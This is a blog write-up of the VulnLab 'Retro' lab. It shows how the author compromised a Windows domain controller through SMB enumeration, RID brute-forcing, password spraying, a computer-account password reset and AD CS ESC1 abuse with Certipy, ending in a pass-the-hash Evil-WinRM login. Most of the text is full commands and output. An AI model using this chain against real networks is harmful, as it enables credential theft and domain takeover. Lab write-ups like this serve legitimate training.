---
title: "Retro"
description: "And here we go again! It’s Maverick, back with another VulnLab machine this time diving into AD CS, specifically ESC1."
pubDate: 2025-02-18
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 18
coverImage: "https://cdn-images-1.medium.com/max/800/1*PXY2Y8PVlngqdld2_2dcUg.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*PXY2Y8PVlngqdld2_2dcUg.png)

### Retro | VulnLab

And here we go again! It’s Maverick, back with another VulnLab machine this time diving into AD CS, specifically ESC1.

Now, if you don’t know what AD CS is… well, where have you been? 😆 Back in 2021, Will Schroeder and Lee Chagolla-Christensen dropped an absolute banger of a research paper on Active Directory Certificate Services (AD CS) attacks. I *highly* recommend checking out their [blog](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and research paper (*“*[*Certified Pre-Owned: Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)*”*) it’s a goldmine for anyone interested in AD security.

<div class="video-embed"><iframe src="https://www.youtube.com/embed/ejmAIgxFRgM" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

Let’s kick things off with an Nmap scan to uncover the open ports and running services on the target.

```bash
nmap -sCV 10.10.124.218 -oN nmap  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:48 EET  
Nmap scan report for 10.10.124.218  
Host is up (0.56s latency).  
Not shown: 988 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-17 18:54:38Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC.retro.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl  
| Not valid before: 2025-02-17T18:44:38  
|_Not valid after: 2026-02-17T18:44:38  
|_ssl-date: TLS randomness does not represent time  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC.retro.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl  
| Not valid before: 2025-02-17T18:44:38  
|_Not valid after: 2026-02-17T18:44:38  
|_ssl-date: TLS randomness does not represent time  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC.retro.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl  
| Not valid before: 2025-02-17T18:44:38  
|_Not valid after: 2026-02-17T18:44:38  
|_ssl-date: TLS randomness does not represent time  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=DC.retro.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl  
| Not valid before: 2025-02-17T18:44:38  
|_Not valid after: 2026-02-17T18:44:38  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| rdp-ntlm-info:  
| Target_Name: RETRO  
| NetBIOS_Domain_Name: RETRO  
| NetBIOS_Computer_Name: DC  
| DNS_Domain_Name: retro.vl  
| DNS_Computer_Name: DC.retro.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-17T18:55:29+00:00  
|_ssl-date: 2025-02-17T18:56:07+00:00; +5m35s from scanner time.  
| ssl-cert: Subject: commonName=DC.retro.vl  
| Not valid before: 2025-02-16T18:53:28  
|_Not valid after: 2025-08-18T18:53:28  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 5m34s, deviation: 0s, median: 5m34s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2025-02-17T18:55:28  
|_ start_date: N/A  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 127.40 seconds
```

So, what do we have? We have Kerberos, LDAP, DNS, and SMB. Let’s enumerate them one by one in detail. Are you ready? The journey is beginning!

#### smb

Checking SMB anonymous login using `smbclient`.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# smbclient -L //10.10.124.218//  
Password for [WORKGROUP\root]:  
  
Sharename Type Comment  
--------- ---- -------  
ADMIN$ Disk Remote Admin  
C$ Disk Default share  
IPC$ IPC Remote IPC  
NETLOGON Disk Logon server share  
Notes Disk  
SYSVOL Disk Logon server share  
Trainees Disk  
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 10.10.124.218 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u user -p user  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [+] retro.vl\user:user (Guest)  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# smbclient //10.10.124.218/Trainees -U test  
  
Password for [WORKGROUP\test]:  
Try "help" to get a list of possible commands.  
smb: \> help  
? allinfo altname archive backup  
blocksize cancel case_sensitive cd chmod  
chown close del deltree dir  
du echo exit get getfacl  
geteas hardlink help history iosize  
lcd link lock lowercase ls  
l mask md mget mkdir  
mkfifo more mput newer notify  
open posix posix_encrypt posix_open posix_mkdir  
posix_rmdir posix_unlink posix_whoami print prompt  
put pwd q queue quit  
readlink rd recurse reget rename  
reput rm rmdir showacls setea  
setmode scopy stat symlink tar  
tarmode timeout translate unlock volume  
vuid wdel logon listconnect showconnect  
tcon tdis tid utimes logoff  
.. !  
smb: \> ls  
. D 0 Mon Jul 24 00:58:43 2023  
.. DHS 0 Wed Jul 26 12:54:14 2023  
Important.txt A 288 Mon Jul 24 01:00:13 2023  
  
6261499 blocks of size 4096. 2220912 blocks available  
smb: \> get Important.txt  
getting file \Important.txt of size 288 as Important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \>  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# cat Important.txt  
Dear Trainees,  
  
I know that some of you seemed to struggle with remembering strong and unique passwords.  
So we decided to bundle every one of you up into one account.  
Stop bothering us. Please. We have other stuff to do than resetting your password every day.  
  
Regards  
  
The Admins
```

After finding “trainee” in SMB and investigating further, I checked their shared files and validated their existence as users. At this point, I like to check for a RID cycling attack — it often gives me great results for discovering valid users to enumerate further. I used `netxec` for this because, as I’ve mentioned before in my write-ups, it’s the Swiss Army knife of tools—I absolutely love it!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u trainee -p 'trainee' --rid-brute 10000  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [+] retro.vl\trainee:trainee  
SMB 10.10.124.218 445 DC 498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.124.218 445 DC 500: RETRO\Administrator (SidTypeUser)  
SMB 10.10.124.218 445 DC 501: RETRO\Guest (SidTypeUser)  
SMB 10.10.124.218 445 DC 502: RETRO\krbtgt (SidTypeUser)  
SMB 10.10.124.218 445 DC 512: RETRO\Domain Admins (SidTypeGroup)  
SMB 10.10.124.218 445 DC 513: RETRO\Domain Users (SidTypeGroup)  
SMB 10.10.124.218 445 DC 514: RETRO\Domain Guests (SidTypeGroup)  
SMB 10.10.124.218 445 DC 515: RETRO\Domain Computers (SidTypeGroup)  
SMB 10.10.124.218 445 DC 516: RETRO\Domain Controllers (SidTypeGroup)  
SMB 10.10.124.218 445 DC 517: RETRO\Cert Publishers (SidTypeAlias)  
SMB 10.10.124.218 445 DC 518: RETRO\Schema Admins (SidTypeGroup)  
SMB 10.10.124.218 445 DC 519: RETRO\Enterprise Admins (SidTypeGroup)  
SMB 10.10.124.218 445 DC 520: RETRO\Group Policy Creator Owners (SidTypeGroup)  
SMB 10.10.124.218 445 DC 521: RETRO\Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.124.218 445 DC 522: RETRO\Cloneable Domain Controllers (SidTypeGroup)  
SMB 10.10.124.218 445 DC 525: RETRO\Protected Users (SidTypeGroup)  
SMB 10.10.124.218 445 DC 526: RETRO\Key Admins (SidTypeGroup)  
SMB 10.10.124.218 445 DC 527: RETRO\Enterprise Key Admins (SidTypeGroup)  
SMB 10.10.124.218 445 DC 553: RETRO\RAS and IAS Servers (SidTypeAlias)  
SMB 10.10.124.218 445 DC 571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.124.218 445 DC 572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.124.218 445 DC 1000: RETRO\DC$ (SidTypeUser)  
SMB 10.10.124.218 445 DC 1101: RETRO\DnsAdmins (SidTypeAlias)  
SMB 10.10.124.218 445 DC 1102: RETRO\DnsUpdateProxy (SidTypeGroup)  
SMB 10.10.124.218 445 DC 1104: RETRO\trainee (SidTypeUser)  
SMB 10.10.124.218 445 DC 1106: RETRO\BANKING$ (SidTypeUser)  
SMB 10.10.124.218 445 DC 1107: RETRO\jburley (SidTypeUser)  
SMB 10.10.124.218 445 DC 1108: RETRO\HelpDesk (SidTypeGroup)  
SMB 10.10.124.218 445 DC 1109: RETRO\tblack (SidTypeUser)
```

You can also do this with `impacket-lookupsids`!

```bash
# you can use this command to filter users  
lookupsid.py anonymous@10.10.124.218 -no-pass | grep 'SidTypeUser' | sed 's/RETRO\\//g' | awk '{print $2}' > clean_users.txt  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# lookupsid.py anonymous@10.10.124.218 -no-pass  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Brute forcing SIDs at 10.10.124.218  
[*] StringBinding ncacn_np:10.10.124.218[\pipe\lsarpc]  
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172  
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)  
500: RETRO\Administrator (SidTypeUser)  
501: RETRO\Guest (SidTypeUser)  
502: RETRO\krbtgt (SidTypeUser)  
512: RETRO\Domain Admins (SidTypeGroup)  
513: RETRO\Domain Users (SidTypeGroup)  
514: RETRO\Domain Guests (SidTypeGroup)  
515: RETRO\Domain Computers (SidTypeGroup)  
516: RETRO\Domain Controllers (SidTypeGroup)  
517: RETRO\Cert Publishers (SidTypeAlias)  
518: RETRO\Schema Admins (SidTypeGroup)  
519: RETRO\Enterprise Admins (SidTypeGroup)  
520: RETRO\Group Policy Creator Owners (SidTypeGroup)  
521: RETRO\Read-only Domain Controllers (SidTypeGroup)  
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)  
525: RETRO\Protected Users (SidTypeGroup)  
526: RETRO\Key Admins (SidTypeGroup)  
527: RETRO\Enterprise Key Admins (SidTypeGroup)  
553: RETRO\RAS and IAS Servers (SidTypeAlias)  
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)  
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)  
1000: RETRO\DC$ (SidTypeUser)  
1101: RETRO\DnsAdmins (SidTypeAlias)  
1102: RETRO\DnsUpdateProxy (SidTypeGroup)  
1104: RETRO\trainee (SidTypeUser)  
1106: RETRO\BANKING$ (SidTypeUser)  
1107: RETRO\jburley (SidTypeUser)  
1108: RETRO\HelpDesk (SidTypeGroup)  
1109: RETRO\tblack (SidTypeUser)
```

### Checking for Capability of Trainee User

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u trainee -p 'trainee' --shares  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [+] retro.vl\trainee:trainee  
SMB 10.10.124.218 445 DC [*] Enumerated shares  
SMB 10.10.124.218 445 DC Share Permissions Remark  
SMB 10.10.124.218 445 DC ----- ----------- ------  
SMB 10.10.124.218 445 DC ADMIN$ Remote Admin  
SMB 10.10.124.218 445 DC C$ Default share  
SMB 10.10.124.218 445 DC IPC$ READ Remote IPC  
SMB 10.10.124.218 445 DC NETLOGON READ Logon server share  
SMB 10.10.124.218 445 DC Notes READ  
SMB 10.10.124.218 445 DC SYSVOL READ Logon server share  
SMB 10.10.124.218 445 DC Trainees READ
```

Now we’ve got “Notes” — have you seen this before? Nope? Let’s check it out!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# smbclient -U 'trainee' //10.10.124.218/Notes  
Password for [WORKGROUP\trainee]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Mon Jul 24 01:03:16 2023  
.. DHS 0 Wed Jul 26 12:54:14 2023  
ToDo.txt A 248 Mon Jul 24 01:05:56 2023  
  
6261499 blocks of size 4096. 2893217 blocks available  
smb: \> get ToDo.txt  
getting file \ToDo.txt of size 248 as ToDo.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \> exit  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# cat ToDo.txt  
Thomas,  
  
after convincing the finance department to get rid of their ancienct banking software  
it is finally time to clean up the mess they made. We should start with the pre created  
computer account. That one is older than me.  
  
Best  
  
James
```

For further SMB enumeration, I used the `-M spider_plus` module in NetExec. You should always use this it's a game-changer!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u trainee -p 'trainee' -M spider_plus  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [+] retro.vl\trainee:trainee  
SPIDER_PLUS 10.10.124.218 445 DC [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.10.124.218 445 DC [*] DOWNLOAD_FLAG: False  
SPIDER_PLUS 10.10.124.218 445 DC [*] STATS_FLAG: True  
SPIDER_PLUS 10.10.124.218 445 DC [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.10.124.218 445 DC [*] EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.10.124.218 445 DC [*] MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.10.124.218 445 DC [*] OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus  
SMB 10.10.124.218 445 DC [*] Enumerated shares  
SMB 10.10.124.218 445 DC Share Permissions Remark  
SMB 10.10.124.218 445 DC ----- ----------- ------  
SMB 10.10.124.218 445 DC ADMIN$ Remote Admin  
SMB 10.10.124.218 445 DC C$ Default share  
SMB 10.10.124.218 445 DC IPC$ READ Remote IPC  
SMB 10.10.124.218 445 DC NETLOGON READ Logon server share  
SMB 10.10.124.218 445 DC Notes READ  
SMB 10.10.124.218 445 DC SYSVOL READ Logon server share  
SMB 10.10.124.218 445 DC Trainees READ  
SPIDER_PLUS 10.10.124.218 445 DC [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.124.218.json".  
SPIDER_PLUS 10.10.124.218 445 DC [*] SMB Shares: 7 (ADMIN$, C$, IPC$, NETLOGON, Notes, SYSVOL, Trainees)  
SPIDER_PLUS 10.10.124.218 445 DC [*] SMB Readable Shares: 5 (IPC$, NETLOGON, Notes, SYSVOL, Trainees)  
SPIDER_PLUS 10.10.124.218 445 DC [*] SMB Filtered Shares: 1  
SPIDER_PLUS 10.10.124.218 445 DC [*] Total folders found: 19  
SPIDER_PLUS 10.10.124.218 445 DC [*] Total files found: 7  
SPIDER_PLUS 10.10.124.218 445 DC [*] File size average: 1.24 KB  
SPIDER_PLUS 10.10.124.218 445 DC [*] File size min: 22 B  
SPIDER_PLUS 10.10.124.218 445 DC [*] File size max: 3.68 KB
```

Do you remember the users we found during the RID cycling attack? It’s time to spray some passwords using NetExec! But wait I almost missed an important step. Before that, we need to validate the users using Kerberos with the `Kerbrute` tool.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# kerbrute userenum -d retro.vl users.txt --dc 10.10.124.218  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 02/17/25 - Ronnie Flathers @ropnop  
  
2025/02/17 21:22:22 > Using KDC(s):  
2025/02/17 21:22:22 > 10.10.124.218:88  
  
2025/02/17 21:22:22 > [+] VALID USERNAME: Trainee@retro.vl  
2025/02/17 21:22:22 > [+] VALID USERNAME: Administrator@retro.vl  
2025/02/17 21:22:22 > Done! Tested 3 usernames (2 valid) in 0.560 seconds  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# kerbrute userenum -d retro.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.124.218  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 02/17/25 - Ronnie Flathers @ropnop  
  
2025/02/17 21:20:50 > Using KDC(s):  
2025/02/17 21:20:50 > 10.10.124.218:88  
  
2025/02/17 21:21:25 > [+] VALID USERNAME: guest@retro.vl  
2025/02/17 21:22:39 > [+] VALID USERNAME: administrator@retro.vl  
2025/02/17 21:39:55 > [+] VALID USERNAME: Guest@retro.vl  
2025/02/17 21:39:59 > [+] VALID USERNAME: Administrator@retro.vl
```

Here, I’m checking with two wordlists one containing the users we initially found and another with common usernames from the SecLists wordlist. This is crucial because, in some scenarios, you might not have any discovered users to work with.

I usually move on to pentesting after this step, but just a heads-up you should also test for **Kerberoasting** and **ASREPRoasting** attacks at this stage. Just wanted to throw that out there!

It’s time to start password spraying! 🔥 You can use Kerbrute for this, but as I’ve said before, I love playing with NetExec!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u clean_users.txt -p clean_users.txt  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Guest:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\krbtgt:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\DC$:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\trainee:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\BANKING$:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\jburley:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\tblack:Administrator STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Administrator:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Guest:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\krbtgt:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\DC$:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\trainee:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\BANKING$:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\jburley:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\tblack:Guest STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Administrator:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Guest:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\DC$:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\trainee:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\BANKING$:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\jburley:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\tblack:krbtgt STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Administrator:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Guest:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\krbtgt:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\trainee:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\BANKING$:DC$ STATUS_LOGON_FAILURE🈁🈁🈁🈁🈁🈁🈁🈁🈁🈁  
SMB 10.10.124.218 445 DC [-] retro.vl\jburley:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\tblack:DC$ STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Administrator:trainee STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\Guest:trainee STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\krbtgt:trainee STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [-] retro.vl\DC$:trainee STATUS_LOGON_FAILURE  
SMB 10.10.124.218 445 DC [+] retro.vl\trainee:trainee
```

Nothing interesting here since we already knew the **trainee** user could log in with the “**trainee**” password.

But there’s something interesting in the output of `impacket-lookupsids`—did you notice that? 🤔 There’s a computer account: `Banking$`, and its password is the same as its name, which we also confirmed during the password spraying. **Note:** Whenever you discover a new user during enumeration, always add it to your wordlist for spraying later

So, it’s a valid user with a valid password, but the error we got during spraying indicates that the password needs to be changed. To fix this, we need to modify the `/etc/krb5.conf` file and use the `kpasswd` tool to update the password.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# cat /etc/krb5.conf  
[libdefaults]  
default_realm = RETRO.VL  
dns_lookup_realm = false  
dns_lookup_kdc = false  
forwardable = true  
ticket_lifetime = 24h  
renew_lifetime = 7d  
  
[realms]  
RETRO.VL = {  
kdc = 10.10.124.218  
admin_server = 10.10.124.218  
default_domain = RETRO.VL  
}  
  
[domain_realm]  
.retro.vl = RETRO.VL  
retro.vl = RETRO.VL                                                                                                   
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# kpasswd BANKING$  
  
Password for BANKING$@RETRO.VL:  
Enter new password:  
Enter it again:  
Password changed.  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# banking1234
```

#### Checking for Validation of the Password Just Set

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc smb 10.10.124.218 -u 'BANKING$' -p 'banking1234'  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
SMB 10.10.124.218 445 DC [+] retro.vl\BANKING$:banking1234
```

#### AD CS as Part of the Things You Need to Check

I will use the NetExec module for this first, then follow up with Certipy by Oliver Lyak a fantastic tool for all AD CS attacks — for additional AD CS scanning And Exploitation.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# nxc ldap 10.10.124.218 -u trainee -p 'trainee' -M adcs  
SMB 10.10.124.218 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.124.218 389 DC [+] retro.vl\trainee:trainee  
ADCS 10.10.124.218 389 DC [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS 10.10.124.218 389 DC Found PKI Enrollment Server: DC.retro.vl  
ADCS 10.10.124.218 389 DC Found CN: retro-DC-CA
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# certipy find -u trainee -p 'trainee' -vulnerable -stdout -dc-ip 10.10.124.218  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA  
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Got CA configuration for 'retro-DC-CA'  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : retro-DC-CA  
DNS Name : DC.retro.vl  
Certificate Subject : CN=retro-DC-CA, DC=retro, DC=vl  
Certificate Serial Number : 7A107F4C115097984B35539AA62E5C85  
Certificate Validity Start : 2023-07-23 21:03:51+00:00  
Certificate Validity End : 2028-07-23 21:13:50+00:00  
Web Enrollment : Disabled  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Permissions  
Owner : RETRO.VL\Administrators  
Access Rights  
ManageCertificates : RETRO.VL\Administrators  
RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
ManageCa : RETRO.VL\Administrators  
RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
Enroll : RETRO.VL\Authenticated Users  
Certificate Templates  
0  
Template Name : RetroClients  
Display Name : Retro Clients  
Certificate Authorities : retro-DC-CA  
Enabled : True  
Client Authentication : True  
Enrollment Agent : False  
Any Purpose : False  
Enrollee Supplies Subject : True  
Certificate Name Flag : EnrolleeSuppliesSubject  
Enrollment Flag : None  
Private Key Flag : 16842752  
Extended Key Usage : Client Authentication  
Requires Manager Approval : False  
Requires Key Archival : False  
Authorized Signatures Required : 0  
Validity Period : 1 year  
Renewal Period : 6 weeks  
Minimum RSA Key Length : 4096  
Permissions  
Enrollment Permissions  
Enrollment Rights : RETRO.VL\Domain Admins  
RETRO.VL\Domain Computers  
RETRO.VL\Enterprise Admins  
Object Control Permissions  
Owner : RETRO.VL\Administrator  
Write Owner Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
Write Dacl Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
Write Property Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
[!] Vulnerabilities  
ESC1 : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Now that we know it’s vulnerable to ESC1, it’s time to dig deeper and exploit it!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# certipy req -u '@retro.vl">banking$'@retro.vl -p 'banking1234' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator' -key-size 4096 -debug  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[+] Trying to resolve 'dc.retro.vl' at '8.8.8.8'  
[+] Trying to resolve 'RETRO.VL' at '8.8.8.8'  
[+] Generating RSA key  
[*] Requesting certificate via RPC  
[+] Trying to connect to endpoint: ncacn_np:10.10.124.218[\pipe\cert]  
[+] Connected to endpoint: ncacn_np:10.10.124.218[\pipe\cert]  
[*] Successfully requested certificate  
[*] Request ID is 9  
[*] Got certificate with UPN 'administrator'  
[*] Certificate has no object SID  
[*] Saved certificate and private key to 'administrator.pfx'  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.124.218  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Using principal: administrator@retro.vl  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d9-------------  
  
┌──(root㉿kali)-[/home/kali/VulnLab/retero_1]  
└─# evil-winrm -i dc.retro.vl -u administrator -H 252fac7066d9--------  
  
Evil-WinRM shell v3.5  
  
